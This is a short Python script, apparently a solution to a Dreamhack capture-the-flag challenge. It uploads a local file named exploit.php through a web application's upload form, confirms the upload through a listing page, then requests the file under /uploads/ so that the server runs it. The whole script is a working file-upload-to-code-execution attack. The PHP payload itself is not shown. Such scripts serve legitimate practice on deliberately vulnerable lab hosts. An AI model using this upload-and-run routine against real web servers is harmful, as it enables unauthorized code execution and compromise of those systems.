import requests

filename = "exploit.php"
port = 11863
url_index = f"http://host1.dreamhack.games:{port}/"
url_upload = url_index + "upload.php"
url_list = url_index + "/list.php"
url_exploit = url_index + f"/uploads/{filename}"

# upload exploit file
file = open(f"./{filename}", "rb")
param = {"file": file}
response = requests.post(url_upload, files=param)
print(response.status_code)

# check upload
response = requests.get(url_list)
print(response.text)

# run uploaded file
response = requests.get(url_exploit)
print(response.text)
